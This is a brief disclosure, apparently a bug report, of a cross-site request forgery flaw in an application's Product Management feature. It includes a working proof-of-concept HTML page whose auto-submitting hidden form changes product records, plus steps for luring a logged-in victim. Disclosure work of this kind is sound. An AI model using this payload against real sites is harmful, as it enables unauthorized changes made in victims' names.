# Cross-site Request Forgery

The application is vulnerable to a Cross-sites-Request-Forgery in Product Management feature. The application fails to implement anti-CSRF token to prevent forced browsing.

# Exploitation 

- Host the following in the attacker controlled web server

```html
<html>
    <body onload='document.hidden_form.submit()'>
        <form name="hidden_form" method="POST" action="http://<<VICTIM IP,DOMAIN>>/app/modifyproduct">
            <input type="hidden" name="name" value="Hacked">
            <input type="hidden" name="code" value="hacked">
            <input type="hidden" name="tags" value="hack">
            <input type="hidden" name="description" value="This is a hacked product">
        </form>
    </body>
</html>
```


-  Make the victim click a link to this page
-  Victim must be logged into the website





